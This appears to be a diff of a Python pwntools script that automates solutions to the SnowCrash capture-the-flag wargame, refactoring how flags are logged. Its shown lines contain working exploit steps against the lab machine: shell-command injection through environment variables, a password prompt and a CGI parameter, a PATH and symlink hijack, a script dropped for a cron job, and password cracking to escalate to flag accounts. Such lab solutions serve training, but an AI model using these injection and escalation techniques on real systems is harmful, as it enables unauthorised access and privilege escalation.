@@ -1,11 +1,10 @@
 #!/usr/bin/env python2
 import re
 import sys
-import ctypes
-import pprint
 from pwn import *
 
-flag_reg = re.compile("\w{25}")
+context.log_level = "CRITICAL"
+flag_reg = re.compile("\w{25,39}")
 flags = []
 ref_flags = [
     "x24ti5gi3x0ol2eh4esiuxias",
@@ -36,16 +35,24 @@ def rot_alpha(n):
     return lambda s: s.translate(lookup)
 
 
+def add_flag(res, check):
+    if res is not None:
+        match = flag_reg.search(res)
+        if match is not None and match.group(0) is not None and "AAAAA" not in match.group(0):
+            found = match.group(0)
+            flags.append(found)
+            flags_idx = flags.index(found)
+            with context.local(log_level="WARNING"):
+                log.warn("Level%(idx)02d - Found flag%(idx)02d: %(fl)s" % {"idx": flags_idx, "fl": found})
+
+
 def get_flag_as_user(shell, usr, passwd):
     pr = shell.run("su " + usr)
     pr.sendlineafter("Password: ", passwd)
     pr.sendlineafter(usr + "@SnowCrash:~$ ", "getflag")
-    if usr != "flag14":
-        ret = flag_reg.search(pr.recvline(keepends=False)).group(0)
-    else:
-        ret = re.search("\w{39}", pr.recvline(keepends=False)).group(0)
+    ret = pr.recvline(keepends=False)
     pr.close()
-    return ret
+    add_flag(ret, int(usr[-2:]))
 
 
 # level00
@@ -54,10 +61,10 @@ def level00():
     sh = ssh("level00", rhost, password="level00", port=rport)
     johnpath = sh["find / -user flag00 2>/dev/null"].splitlines()[0]
     john = sh["cat " + johnpath]
-    print john
-    john = rot_alpha(11)(john)
-    print john
-    flags.append(get_flag_as_user(sh, "flag00", john))
+    hnjo = rot_alpha(11)(john)
+    with context.local(log_level="WARNING"):
+        log.warn("Level00 - %s -> %s" % (john, hnjo))
+    get_flag_as_user(sh, "flag00", hnjo)
     sh["exit"]
     sh.close()
 
@@ -71,8 +78,8 @@ def level01():
     passwd = re.search(
         "flag01:(\w*):3001", process(["john", "--show", "pass"]).recvall()
     ).group(1)
-    flags.append(get_flag_as_user(sh, "flag01", passwd))
-    print process(["rm", "-f", "pass"]).recvall()
+    get_flag_as_user(sh, "flag01", passwd)
+    process(["rm", "-f", "pass"]).recvall()
     sh["exit"]
     sh.close()
 
@@ -95,20 +102,20 @@ def level02():
     passwd = ""
     for i in [chr(int(j, 16)) for j in pckts[:-1]]:
         passwd += i
-    print "flag02 login:" + passwd
-    flags.append(get_flag_as_user(sh, "flag02", passwd))
-    print process(["rm", "-f", "level02.pcap"]).recvall()
+    with context.local(log_level="WARNING"):
+        log.warn("Level02 - flag02 password: %s" % passwd)
+    get_flag_as_user(sh, "flag02", passwd)
+    process(["rm", "-f", "level02.pcap"]).recvall()
     sh["exit"]
     sh.close()
 
 
 # level03
+# symlinks and PATH shenanigans
 def level03():
     sh = ssh("level03", rhost, password=flags[2], port=rport)
     sh["ln -s /bin/getflag /tmp/echo"]
-    flap = flag_reg.search(sh["env PATH=/tmp:$PATH ./level03"]).group(0)
-    print "levle03 flag: " + flap
-    flags.append(flap)
+    add_flag(sh["env PATH=/tmp:$PATH ./level03"], 3)
     sh["rm -f /tmp/echo; exit"]
     sh.close()
 
@@ -128,22 +135,21 @@ def level04():
             "x=;getflag",
         ]
     )
-    flags.append(flag_reg.search(req.recvall()).group(0))
-    print "level04 flag: " + flags[3]
+    add_flag(req.recvall(), 4)
+    req.close()
 
 
 # level05
+# cronjobs/init.rc
 def level05():
     sh = ssh("level05", rhost, password=flags[4], port=rport)
     res = sh[
         "rm -f /tmp/flag;"
-        "printf '#!/bin/bash\n"
-        "getflag > /tmp/flag\n' > /opt/openarenaserver/snjort;"
+        "printf '#!/bin/sh\ngetflag>/tmp/flag\n' > /opt/openarenaserver/snjort;"
         "chmod +x /opt/openarenaserver/snjort;"
         "while true; do if [ -f /tmp/flag ]; then cat /tmp/flag; exit; fi; done"
     ]
-    flags.append(flag_reg.search(res).group(0))
-    print "level05 flag: " + flags[5]
+    add_flag(res, 5)
     sh["rm -f /tmp/flag; exit"]
     sh.close()
 
@@ -152,8 +158,7 @@ def level05():
 def level06():
     sh = ssh("level06", rhost, password=flags[5], port=rport)
     res = sh["echo '[x {${`getflag`}}]' >/tmp/arg; ./level06 /tmp/arg unused_argument"]
-    flags.append(flag_reg.search(res).group(0))
-    print "level06 flag: " + flags[6]
+    add_flag(res, 6)
     sh["rm -f /tmp/arg; exit"]
     sh.close()
 
@@ -162,8 +167,7 @@ def level06():
 def level07():
     sh = ssh("level07", rhost, password=flags[6], port=rport)
     res = sh["env LOGNAME=\;getflag ./level07"]
-    flags.append(flag_reg.search(res).group(0))
-    print "level07 flag: " + flags[7]
+    add_flag(res, 7)
     sh["exit"]
     sh.close()
 
@@ -172,9 +176,9 @@ def level07():
 def level08():
     sh = ssh("level08", rhost, password=flags[7], port=rport)
     passwd = sh["ln -fs $HOME/token /tmp/test; ./level08 /tmp/test"]
-    print "flag08 login: " + passwd
-    flags.append(get_flag_as_user(sh, "flag08", passwd))
-    print "level08 flag: " + flags[8]
+    with context.local(log_level="WARNING"):
+        log.warn("Level08 - flag08 password: %s" % passwd)
+    get_flag_as_user(sh, "flag08", passwd)
     sh["rm -f /tmp/test; exit"]
     sh.close()
 
@@ -186,9 +190,9 @@ def level09():
     passwd = ""
     for i in xrange(len(token) - 1):
         passwd += chr(ord(token[i]) - i)
-    print "flag09 login: " + passwd
-    flags.append(get_flag_as_user(sh, "flag09", passwd))
-    print "level09 flag: " + flags[9]
+    with context.local(log_level="WARNING"):
+        log.warn("Level09 - flag09 password: %s" % passwd)
+    get_flag_as_user(sh, "flag09", passwd)
     sh["exit"]
     sh.close()
 
@@ -220,9 +224,9 @@ def level10():
         res = p.recv()
         m = flag_reg.search(res)
     passwd = m.group(0)
-    print "flag10 login: " + passwd
-    flags.append(get_flag_as_user(sh, "flag10", passwd))
-    print "level10 flag: " + flags[10]
+    with context.local(log_level="WARNING"):
+        log.warn("Level10 - flag10 password: %s" % passwd)
+    get_flag_as_user(sh, "flag10", passwd)
     sh["rm -f /tmp/flog /tmp/l10 /tmp/honk.sh /tmp/a; exit"]
     sh.close()
 
@@ -234,8 +238,7 @@ def level11():
     p.sendlineafter("Password: ", ":;getflag>/tmp/flag11")
     p.close()
     res = sh["cat /tmp/flag11"]
-    flags.append(flag_reg.search(res).group(0))
-    print "level11 flag: " + flags[11]
+    add_flag(res, 11)
     sh["rm -f /tmp/flag11; exit"]
     sh.close()
 
@@ -251,8 +254,7 @@ def level12():
         "curl localhost:4646/level12.pl?x=\`/*/gonk\`"
     ]
     res = sh["cat /tmp/glag"]
-    flags.append(flag_reg.search(res).group(0))
-    print "level12 flag: " + flags[12]
+    add_flag(res, 12)
     sh["rm -f /tmp/glag /tmp/GONK; exit"]
     sh.close()
 
@@ -272,8 +274,7 @@ def level13():
         "chmod +x /tmp/goat;"
         "/tmp/goat"
     ]
-    flags.append(flag_reg.search(res).group(0))
-    print "level13 flag: " + flags[13]
+    add_flag(res, 13)
     sh["rm -f /tmp/level13 /tmp/goat; exit"]
     sh.close()
 
@@ -303,17 +304,17 @@ def ft_des(arg):
 
 
 # level14
+# cracking open the getflag binary
 def level14():
     sh = ssh("level14", rhost, password=flags[13], port=rport)
     token = sh["strings /bin/getflag | egrep '^[[:print:]]{39}$'"]
     passwd = ft_des(token)
-    flags.append(get_flag_as_user(sh, "flag14", passwd))
-    print "level14 flag: " + flags[14]
+    get_flag_as_user(sh, "flag14", passwd)
     sh["exit"]
     sh.close()
 
 
-def main():
+if __name__ == "__main__":
     tmp = -1
     if len(sys.argv) > 1 and sys.argv[1].isdigit():
         tmp = int(sys.argv[1])
@@ -366,8 +367,3 @@ def main():
         if tmp == 14:
             level14()
     # done
-    pprint(flags)
-
-
-if __name__ == "__main__":
-    main()
